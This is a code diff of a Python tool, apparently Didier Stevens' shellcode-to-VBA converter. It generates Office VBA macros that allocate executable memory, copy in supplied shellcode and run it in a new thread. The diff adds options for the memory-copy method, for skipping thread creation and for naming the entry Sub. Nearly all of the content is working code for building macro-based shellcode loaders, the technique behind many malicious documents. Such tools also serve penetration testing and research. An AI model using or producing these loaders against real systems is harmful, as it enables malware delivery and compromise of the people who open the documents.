@@ -2,8 +2,8 @@
 
 __description__ = 'Tool to create a VBA script containing shellcode to execute'
 __author__ = 'Didier Stevens'
-__version__ = '0.3'
-__date__ = '2013/04/26'
+__version__ = '0.4'
+__date__ = '2015/11/29'
 
 """
 
@@ -17,6 +17,8 @@ History:
   2012/12/19: Fixed BASE64 line length to 80 in stead of 81
   2013/04/24: V0.3 added x64 option; thanks to dominic@sensepost.com
   2013/04/26: Added base64 encoding for x64
+  2015/09/18: V0.4 added option --nocreatethread and --writememory
+  2015/11/29: refactoring, added option --start
 
 Todo:
 """
@@ -24,7 +26,7 @@ Todo:
 import optparse
 import base64
 
-def Shellcode2VBA(filenameShellcode, filenameVBAscript, encoding, x64):
+def Shellcode2VBA(filenameShellcode, filenameVBAscript, encoding, x64, nocreatethread, writememory, start):
     fPayload = open(filenameShellcode, 'rb')
     payload = fPayload.read()
     if encoding == 'base64':
@@ -40,18 +42,24 @@ def Shellcode2VBA(filenameShellcode, filenameVBAscript, encoding, x64):
 
     if not x64:
         print >> outfile, 'Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long'
-        print >> outfile, 'Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal lpBuffer As String, ByVal dwSize As Long, ByRef lpNumberOfBytesWritten As Long) As Integer'
+        if writememory == 'move':
+            print >> outfile, 'Private Declare Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As Long, ByVal sSource As String, ByVal lLength As Long)'
+        else:
+            print >> outfile, 'Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal lpBuffer As String, ByVal dwSize As Long, ByRef lpNumberOfBytesWritten As Long) As Integer'
         print >> outfile, 'Private Declare Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long'
     else:
         print >> outfile, 'Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongLong, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr'
-        print >> outfile, 'Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As Any, ByVal nSize As LongLong, ByRef lpNumberOfBytesWritten As LongPtr) As Long'
+        if writememory == 'move':
+            print >> outfile, 'Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByVal sSource As String, ByVal lLength As Long)'
+        else:
+            print >> outfile, 'Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As Any, ByVal nSize As LongLong, ByRef lpNumberOfBytesWritten As LongPtr) As Long'
         print >> outfile, 'Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongLong, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As LongPtr) As LongPtr'
     print >> outfile, ''
     print >> outfile, 'Const MEM_COMMIT = &H1000'
     print >> outfile, 'Const PAGE_EXECUTE_READWRITE = &H40'
     print >> outfile, ''
 
-    print >> outfile, 'Private Sub ExecuteShellCode()'
+    print >> outfile, ('Public Sub %s()' % start)
     print >> outfile, '\tDim sShellCode As String'
     if not x64:
         print >> outfile, '\tDim lpMemory As Long'
@@ -62,8 +70,14 @@ def Shellcode2VBA(filenameShellcode, filenameVBAscript, encoding, x64):
     print >> outfile, ''
     print >> outfile, '\tsShellCode = ShellCode()'
     print >> outfile, '\tlpMemory = VirtualAlloc(0&, Len(sShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)'
-    print >> outfile, '\tlResult = WriteProcessMemory(-1&, lpMemory, sShellCode, Len(sShellCode), 0&)'
-    print >> outfile, '\tlResult = CreateThread(0&, 0&, lpMemory, 0&, 0&, 0&)'
+    if writememory == 'move':
+        print >> outfile, '\tRtlMoveMemory lpMemory, sShellCode, Len(sShellCode)'
+    else:
+        print >> outfile, '\tlResult = WriteProcessMemory(-1&, lpMemory, sShellCode, Len(sShellCode), 0&)'
+    if nocreatethread:
+        print >> outfile, '\tMsgBox "Address: " & Hex(lpMemory)'
+    else:
+        print >> outfile, '\tlResult = CreateThread(0&, 0&, lpMemory, 0&, 0&, 0&)'
     print >> outfile, 'End Sub'
     print >> outfile, ''
 
@@ -170,9 +184,12 @@ def Main():
     oParser = optparse.OptionParser(usage='usage: %prog [options] infile outfile.vbs\n' + __description__ + '\nVersion V' + __version__, version='%prog ' + __version__)
     oParser.add_option('-e', '--encoding', default='base64', help='select encoding: base64 (default) or legacy')
     oParser.add_option('-x', '--x64', action='store_true', default=False, help='generate VBA for 64-bit')
+    oParser.add_option('-n', '--nocreatethread', action='store_true', default=False, help='do not call CreateThread')
+    oParser.add_option('-w', '--writememory', default='move', help='select how to write to memory: move (default) or process')
+    oParser.add_option('-s', '--start', default='ExecuteShellCode', help='name of start Sub (default ExecuteShellCode)')
     (options, args) = oParser.parse_args()
 
-    if len(args) != 2 or not options.encoding in ('legacy', 'base64'):
+    if len(args) != 2 or not options.encoding in ('legacy', 'base64') or not options.writememory in ('move', 'process'):
         oParser.print_help()
         print ''
         print '  %s' % __description__
@@ -182,7 +199,7 @@ def Main():
         return
 
     else:
-        Shellcode2VBA(args[0], args[1], options.encoding, options.x64)
+        Shellcode2VBA(args[0], args[1], options.encoding, options.x64, options.nocreatethread, options.writememory, options.start)
 
 if __name__ == '__main__':
     Main()
